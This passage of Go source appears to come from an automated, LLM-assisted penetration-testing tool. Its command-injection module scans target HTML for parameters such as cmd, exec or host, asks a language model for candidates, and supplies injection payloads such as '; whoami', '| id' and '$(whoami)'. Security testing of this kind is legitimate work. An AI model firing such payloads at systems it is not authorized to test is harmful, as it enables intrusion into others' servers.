	// If no private IP, use the first available IP
	serverAddr := fmt.Sprintf("%s:%d", ips[0], tunnelPort)
	log.Printf("[selectParentAddress] No private IP found, using first IP: %s", serverAddr)
	return serverAddr
}

// ============================================================================
// Pattern Matching + LLM Analysis Functions (NEW)
// ============================================================================

// CMDiCandidate represents a potential command injection vulnerability found by LLM
type CMDiCandidate struct {
	Location          string   `json:"location"`
	Parameter         string   `json:"parameter"`
	Method            string   `json:"method"`
	LikelyCommand     string   `json:"likely_command"`
	Confidence        string   `json:"confidence"`
	Reasoning         string   `json:"reasoning"`
	SuggestedPayloads []string `json:"suggested_payloads"`
}

// CMDiAnalysisResult represents the LLM analysis result
type CMDiAnalysisResult struct {
	VulnerabilityFound bool            `json:"vulnerability_found"`
	Candidates         []CMDiCandidate `json:"candidates"`
}

// patternMatchCMDi performs fast pattern matching to detect command injection indicators
// Returns parameter name if found, empty string otherwise
func (c *CommandInjectionSpecialist) patternMatchCMDi(htmlContent string) (string, string) {
	lowerHTML := strings.ToLower(htmlContent)

	// Command injection parameter patterns (high confidence)
	cmdParams := []struct {
		pattern string
		param   string
	}{
		// Direct command parameters
		{`name="command"`, "command"},
		{`name='command'`, "command"},
		{`name="cmd"`, "cmd"},
		{`name='cmd'`, "cmd"},
		{`name="exec"`, "exec"},
		{`name='exec'`, "exec"},
		{`name="execute"`, "execute"},
		{`name='execute'`, "execute"},
		{`name="system"`, "system"},
		{`name='system'`, "system"},
		{`name="run"`, "run"},
		{`name='run'`, "run"},
		// Network tool parameters
		{`name="host"`, "host"},
		{`name='host'`, "host"},
		{`name="ip"`, "ip"},
		{`name='ip'`, "ip"},
		{`name="ping"`, "ping"},
		{`name='ping'`, "ping"},
		{`name="target"`, "target"},
		{`name='target'`, "target"},
		{`name="address"`, "address"},
		{`name='address'`, "address"},
	}

	// Check for command-related input fields
	for _, p := range cmdParams {
		if strings.Contains(lowerHTML, p.pattern) {
			log.Printf("[%s] Pattern match: found parameter '%s'\n", c.id, p.param)
			return p.param, "pattern"
		}
	}

	// Check for URL parameters in links
	urlParamPatterns := []struct {
		pattern *regexp.Regexp
		param   string
	}{
		{regexp.MustCompile(`[?&]cmd=`), "cmd"},
		{regexp.MustCompile(`[?&]command=`), "command"},
		{regexp.MustCompile(`[?&]exec=`), "exec"},
		{regexp.MustCompile(`[?&]host=`), "host"},
		{regexp.MustCompile(`[?&]ip=`), "ip"},
		{regexp.MustCompile(`[?&]ping=`), "ping"},
		{regexp.MustCompile(`[?&]system=`), "system"},
	}

	for _, p := range urlParamPatterns {
		if p.pattern.MatchString(lowerHTML) {
			log.Printf("[%s] Pattern match: found URL parameter '%s'\n", c.id, p.param)
			return p.param, "url_pattern"
		}
	}

	// Check for command execution keywords in context
	cmdKeywords := []string{
		"ping", "traceroute", "nslookup", "dig", "whois",
		"execute command", "run command", "shell", "terminal",
	}

	for _, keyword := range cmdKeywords {
		if strings.Contains(lowerHTML, keyword) {
			// Found keyword, but need more context - return empty to trigger LLM
			log.Printf("[%s] Pattern match: found keyword '%s', needs LLM analysis\n", c.id, keyword)
			return "", "needs_llm"
		}
	}

	return "", ""
}

// analyzeCMDiWithLLM uses LLM to analyze HTML for command injection vulnerabilities
func (c *CommandInjectionSpecialist) analyzeCMDiWithLLM(htmlContent string) *CMDiAnalysisResult {
	// Limit HTML size for LLM
	htmlToAnalyze := htmlContent
	if len(htmlContent) > 8000 {
		htmlToAnalyze = htmlContent[:8000]
	}

	prompt := prompts.GetCommandInjectionAnalysis(htmlToAnalyze)

	response, err := c.brain.Generate(c.ctx, prompt)
	if err != nil {
		log.Printf("[%s] LLM analysis failed: %v\n", c.id, err)
		return nil
	}

	// Clean response (remove markdown code blocks if present)
	response = strings.TrimSpace(response)
	if strings.HasPrefix(response, "```json") {
		response = strings.TrimPrefix(response, "```json")
		response = strings.TrimSuffix(response, "```")
		response = strings.TrimSpace(response)
	} else if strings.HasPrefix(response, "```") {
		response = strings.TrimPrefix(response, "```")
		response = strings.TrimSuffix(response, "```")
		response = strings.TrimSpace(response)
	}

	// Parse JSON response
	var result CMDiAnalysisResult
	if err := json.Unmarshal([]byte(response), &result); err != nil {
		log.Printf("[%s] Failed to parse LLM JSON: %v\n", c.id, err)
		log.Printf("[%s] Raw LLM response: %s\n", c.id, response[:min(500, len(response))])
		return nil
	}

	return &result
}

// analyzeTargetForCMDi performs pattern matching first, then LLM analysis if needed
// Returns the best parameter to test and suggested payloads
func (c *CommandInjectionSpecialist) analyzeTargetForCMDi(htmlContent string, targetURL string) (string, []string) {
	// Phase 1: Pattern matching (fast)
	param, matchType := c.patternMatchCMDi(htmlContent)

	if param != "" && matchType != "needs_llm" {
		log.Printf("[%s] Pattern match found parameter: %s (type: %s)\n", c.id, param, matchType)
		// Return with default payloads
		return param, []string{"; whoami", "| id", "& echo CMDI_TEST", "`id`", "$(whoami)"}
	}

	// Phase 2: LLM analysis (if pattern match inconclusive or needs confirmation)
	log.Printf("[%s] Running LLM analysis for command injection detection...\n", c.id)
	result := c.analyzeCMDiWithLLM(htmlContent)

	if result == nil || !result.VulnerabilityFound || len(result.Candidates) == 0 {
		log.Printf("[%s] No command injection candidates found by LLM\n", c.id)
		return "", nil
	}

	// Use the highest confidence candidate
	bestCandidate := result.Candidates[0]
	for _, candidate := range result.Candidates {
		if candidate.Confidence == "high" {
			bestCandidate = candidate
			break
		}
	}

	log.Printf("[%s] LLM found candidate: param=%s, confidence=%s, command=%s\n",
		c.id, bestCandidate.Parameter, bestCandidate.Confidence, bestCandidate.LikelyCommand)

	payloads := bestCandidate.SuggestedPayloads
	if len(payloads) == 0 {
		payloads = []string{"; whoami", "| id", "& echo CMDI_TEST"}
	}

	return bestCandidate.Parameter, payloads
}
